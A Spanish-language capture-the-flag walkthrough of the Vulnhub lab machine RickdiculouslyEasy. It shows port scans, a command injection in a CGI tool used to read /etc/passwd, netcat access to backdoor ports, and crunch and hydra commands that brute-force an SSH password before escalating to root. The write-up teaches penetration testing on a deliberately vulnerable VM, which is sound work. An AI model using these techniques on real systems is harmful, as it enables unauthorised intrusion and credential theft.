# CTF: RickdiculouslyEasy



### Vulnhub: https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
**Total de puntos:** 130

----------------

Descargue la vm y luego de correrla en VirtualBox, lo primero que hice fue hacer un escaneo de todos los puertos y las versiones de sus servicios:
```console
vierz@localhost:~# nmap -sV 192.168.56.106 -p- 
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    Cockpit web service
13337/tcp open  unknown
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown
```
Al tener las versiones lo primero que hice fue buscar con "searchsploit" por vulnerabilidades en cada servicio, pero no se encontro nada importante.
Mi proximo paso fue chequear el puerto 80 y el 9090 ya que el mismo esta catalogado como "web service"

La primer bandera la encontre navegando la siguiente url, es la mas sensilla:

**http://192.168.56.106:9090**

Y ya en el body esta la bandera:

#### FLAG {There is no Zeus, in your face!} - 10 Points

---

Mi proximo paso fue seguir con el puerto 80, por lo tanto navegue la ip para ver que me trae:

**http://192.168.56.106**

Ahi pude ingresar a un sitio web, el cual revisando el html y las llamadas con el developer tools de firefox no encontre nada.
Mi proximo paso fue intentar ver si hay un robots.txt para ver si tienen listado algun directorio Disallow.
Ingresando a **http://192.168.56.106/robots.txt** encontre lo siguiente:
```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

Luego de ver los directorios, ingrese a **/cgi-bin/root_shell.cgi** pero era algo falso, no tenia nada importante ese archivo.
El segundo archivo, **/cgi-bin/tracertool.cgi**, tiene una herramienta para hacer trace a IPs.
Probe ingresando cualquier ip a ver que me devuelve a ver si funciona y correctamente me devolvio algo.
Ingrese 8.8.8.8 y la respuesta fue:
```
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
```
Lo proximo que probe fue hacer un command injection haciendo un **ls -la**. Puse lo sigueinte en el cuadro de trace

![alt text](https://i.imgur.com/0m8uZV0.png)


Listo, esto se puede explotar de alguna manera, asi que hice que me liste todo un paso atras:

![alt text](https://i.imgur.com/FWaSKyp.png)

Ahi pude ingresar a la carpeta html y ver que existe un archivo llamado "password"

![alt text](https://i.imgur.com/zkB7hQi.png)

Por ultimo navegue a esa misma ruta y vi que el directorio estaba con el Index habilitado y tenia un archivo llamado FLAG.txt donde encontre la segunda bandera.

**http://192.168.56.106/passwords/**

![alt text](https://i.imgur.com/ukCit3U.png)

#### FLAG{Yeah d- just don't do it.} - 10 Points

Por ultimo revise el archivo **passwords.html** que a simple vista no tenia nada importante, pero viendo el codigo fuente encontre un comentario:

```html
<!--Password: winter-->
```
Por lo tanto ya tenemos un password de alguien pero no sabemos de quien.

**Password:** winter

---

Una vez conseguida esa bandera, pense que se podia usar el mismo exploit para traer el contenido de /etc/passwd

![alt text](https://i.imgur.com/bMQBhVy.png)

Viendo el contenido tome nota de los usuarios que pueden usar bash:

+ **RickSanchez**
+ **Morty**
+ **Summer**

Luego segui intentando ver si podia seguir explotando algo pero al ver que no, segui con los proximos puertos.

---

El proximo puerto con el que segui fue el del ftp, el puerto 21.
Lo primero que hice fue correr un nmap con los scripts mas comunes que vienen por defecto con la opcion -sC

```console
vierz@localhost:~# nmap -sC 192.168.56.106 -p 21
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-27 12:39 EDT
Nmap scan report for pepe.com (192.168.56.106)
Host is up (0.0038s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```
Y lo primero que vi fue que esta permitido el logueo anonimo y veo listado un archivo llamado FLAG.txt
Asi que lo siguiente fue hacer un curl al archivo para ver el contenido y de esa manera consegui otra bandera.

```console
vierz@localhost:~# curl ftp://192.168.56.106/FLAG.txt
FLAG{Whoa this is unexpected} - 10 Points
```
#### FLAG{Whoa this is unexpected} - 10 Points
---

El proximo puerto con el que segui fue el 13337 que no esta asignado a ningun servicio.
Utilice **netcat** para intentar caputrar el banner, y cuando lo hice, me devolvio otra bandera:

```console
root@atkvm:~# nc 192.168.56.106 13337
FLAG:{TheyFoundMyBackDoorMorty}-10Points
```

#### FLAG:{TheyFoundMyBackDoorMorty}-10Points

---

Para este proximo puerto, el 60000, intente lo mismo que el anterior para ver si puedo capturar el banner, pero esta vez vi que me devolvio un tipo de shell, y haciendo un ls vi que habia un archivo FLAG.txt al que le hice un cat para ver el contenido y de esta manera consegui otra bandera.

```console
root@atkvm:~# nc 192.168.56.106 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 
# 
```
#### FLAG{Flip the pickle Morty!} - 10 Points
---

Listo ahora me quedan dos puertos, uno es el 22 y el otro es el 22222. Primero intente ingresar por ssh al 22 pero viendo la respuesta, el mismo no estaba usando el puerto de OpenSSH, mismo nmap no pudo identificar el servicio.
Mi primer paso fue correr netcat y como banner solo me devolvio un banner con la version de Linux.

```console
root@atkvm:~# nc 192.168.56.106 22
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
```
Luego de ver que no consegui nada con ese puerto segui con el proximo, el 22222, y este puerto si tiene el servicio de OpenSSH activo.
Mi primer intento fue utilizar alguno de los usuarios que pude listar pasos mas arriba.
La primera opcion fue el usuario **Summer**, y por conjetura use el password **winter** que encontre comentado en el codigo de un archivo, y listo pude ingresar y ver que hay una bandera en el home directory:
```console
root@atkvm:~# ssh Summer@192.168.56.106 -p 22222
Summer@192.168.56.106's password: 
Last failed login: Wed Mar 27 13:49:59 AEDT 2019 from 192.168.56.1 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Wed Mar 27 13:48:04 2019 from 192.168.56.1
[Summer@localhost ~]$
[Summer@localhost ~]$ ls
FLAG.txt  safe
[Summer@localhost ~]$ pwd
/home/Summer
[Summer@localhost ~]$ more FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```
#### FLAG{Get off the high road Summer!} - 10 Points

Luego intente ver que contiene el archivo **safe**, que es un ejecutable y lo unico que consegui fue lo siguiente:
```console
[Summer@localhost ~]$ ./safe 
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
```
Por que dice el texto se ve que tengo que pasarle un argumento a ese archivo, pero no se cual es, asi que sigo investigando que mas puedo hacer teniendo shell.

---

Teniendo shell pude ver que veo los directorios de los otros usuarios en **/home**
Ingrese al directorio del usuario **Morty** y vi los sigueintes archivos
```console
[Summer@localhost ~]$ cd ..
[Summer@localhost home]$ ls
Morty  RickSanchez  Summer
[Summer@localhost home]$ cd Morty/
[Summer@localhost Morty]$ ls
journal.txt.zip  Safe_Password.jpg
[Summer@localhost Morty]$ 
```
Lo primero que hice fue traerme la image con scp
```console
root@atkvm:~# scp -P 22222 Summer@192.168.56.106:/home/Morty/Safe_Password.jpg .Summer@192.168.56.106's password: 
Safe_Password.jpg                             100%   42KB   8.8MB/s   00:00 
```
Viendo la imagen despues de bajarla, vi que no tiene nada en particular, asi que me fije con **strings** a ver que contiene, y vi que se menciona al otro archivo que es un zip y el password del mismo.
```console
root@atkvm:~# strings Safe_Password.jpg 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```
Por lo tanto lo proximo fue utilizar scp para bajarme el zip, y abrirlo con el password **Meeseek**
Al descomprimir el zip, me devolvio un archivo journal.txt que tenia la bandera adentro.
```console
root@atkvm:~# more journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a saf
e password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 
```
#### FLAG: {131333} - 20 Points 

Pero leyendo el journal.txt mencionan el archivo **safe** que corri mas arriba y que necesitaba de un argumento. Aca mencionan tambien una contraseña, y viendo que la bandera tiene un numero lo proximo que intente fue correr ese numero en el archivo safe.
```console
[Summer@localhost Morty]$ cd ..
[Summer@localhost home]$ cd Summer/
[Summer@localhost ~]$ ls
FLAG.txt  safe
[Summer@localhost ~]$ ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@
```
Y ahi tenemos mas informacion y una bandera:
#### FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Luedo viendo el contenido del archivo safe, mencionan pistas de como conseguir el password del usuario de Rick, que en este caso es **RickSanchez** por lo que vimos en el archivo /etc/passwd
Segun el texto el password esta compuesto de la siguiente manera:
+ 1 letra mayuscula
+ 1 numero
+ una de las palabras de su vieja banda.
Nunca vi Rick y Morty asi que fui a google para buscar como se llama la vieja banda, y la respuesta aparecio enseguida:
![alt text](https://i.imgur.com/IzONQb3.png)

**La banda es:** The Flesh Curtains

Listo ya tenia todas las pistas para armar una wordlist y hacer un brute force por ssh con el usuario de rick.
Lo siguiente fue armar una wordlist con crunch usando las pistas.
```console
root@atkvm:~# crunch 7 7 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t ,%flesh >> pass.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@atkvm:~# crunch 7 7 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t ,%Flesh >> pass.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@atkvm:~# crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t ,%curtains >> pass.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@atkvm:~# crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t ,%Curtains >> pass.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
```
Genere 4 listas y las uni en un solo archivo txt para luego utilizar **hydra** para hacer el ataque de fuerza bruta.

```console
root@atkvm:~# hydra -l RickSanchez -P pass.txt 192.168.56.106 -s 22222 ssh -t 4
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-27 15:24:32
[DATA] max 4 tasks per 1 server, overall 4 tasks, 260 login tries (l:1/p:260), ~65 tries per task
[DATA] attacking ssh://192.168.56.106:22222/
[22222][ssh] host: 192.168.56.106   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-03-27 15:29:48
```
Listo ya conseguimos el password de Rick: **P7Curtains**
Por lo tanto vamos a ingresar por ssh, obtener sudo e ingresar a la carpeta **/root** para obtener la ultima bandera:
```console
root@atkvm:~# ssh RickSanchez@192.168.56.106 -p 22222
RickSanchez@192.168.56.106's password: 
Last failed login: Thu Mar 28 06:29:46 AEDT 2019 from 192.168.56.1 on ssh:notty
There were 283 failed login attempts since the last successful login.
Last login: Wed Mar 27 14:08:04 2019 from 192.168.56.1
[RickSanchez@localhost ~]$ sudo su
[sudo] password for RickSanchez: 
[root@localhost RickSanchez]# cd /root
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# more FLAG.txt 
FLAG: {Ionic Defibrillator} - 30 points
```
Listo ya ahi podemos ver la ultima bandera

#### FLAG: {Ionic Defibrillator} - 30 points



